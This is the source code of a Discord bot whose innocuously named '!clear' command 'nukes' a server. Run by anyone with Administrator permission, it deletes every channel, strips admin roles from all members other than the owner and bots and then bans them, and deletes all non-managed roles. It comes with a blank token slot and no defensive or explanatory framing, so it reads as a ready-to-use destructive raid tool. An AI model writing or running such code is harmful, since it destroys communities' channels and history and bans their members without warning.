const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const TOKEN = '';
const PREFIX = '!';
const COMMAND = 'clear';

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === COMMAND) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return message.reply('You do not have permission to use this command.');
    }

    const guild = message.guild;
    let tempChannel;

    try {
      tempChannel = await guild.channels.create({
        name: 'temp-channel',
        type: 0,
        permissionOverwrites: [
          {
            id: guild.roles.everyone,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages],
          },
        ],
      });

      await tempChannel.send(`Created temporary channel: ${tempChannel.name}`);
    } catch (error) {
      console.error('Failed to create temporary channel:', error.message);
    }

    try {
      const channels = guild.channels.cache.filter((ch) => ch.id !== tempChannel?.id);
      for (const channel of channels.values()) {
        try {
          await channel.delete();
          console.log(`Deleted channel: ${channel.name}`);
        } catch (error) {
          console.error(`Failed to delete channel ${channel.name}:`, error.message);
        }
      }
    } catch (error) {
      console.error('Error deleting channels:', error.message);
    }

    try {
      await guild.members.fetch();
      await guild.roles.fetch();

      const members = guild.members.cache.filter(
        (member) => !member.user.bot && member.id !== guild.ownerId
      );

      for (const member of members.values()) {
        try {
          const adminRoles = member.roles.cache.filter((role) => role.permissions.has(PermissionsBitField.Flags.Administrator));
          if (adminRoles.size > 0) {
            await member.roles.remove(adminRoles);
            console.log(`Removed admin roles from ${member.user.tag}`);
          }
          await member.ban();
          console.log(`Banned member: ${member.user.tag}`);
        } catch (error) {
          console.error(`Failed to process ${member.user.tag}:`, error.message);
        }
      }
    } catch (error) {
      console.error('Error processing members:', error.message);
    }

    try {
      const roles = guild.roles.cache.filter(
        (role) =>
          !role.managed &&
          role.id !== guild.roles.everyone.id &&
          !role.permissions.has(PermissionsBitField.Flags.Administrator)
      );

      for (const role of roles.values()) {
        try {
          await role.delete();
          console.log(`Deleted role: ${role.name}`);
        } catch (error) {
          console.error(`Failed to delete role ${role.name}:`, error.message);
        }
      }
    } catch (error) {
      console.error('Error deleting roles:', error.message);
    }

    if (tempChannel) {
      await tempChannel.send('All tasks completed. Server nuked successfully.');
    }
  }
});

client.login(TOKEN);
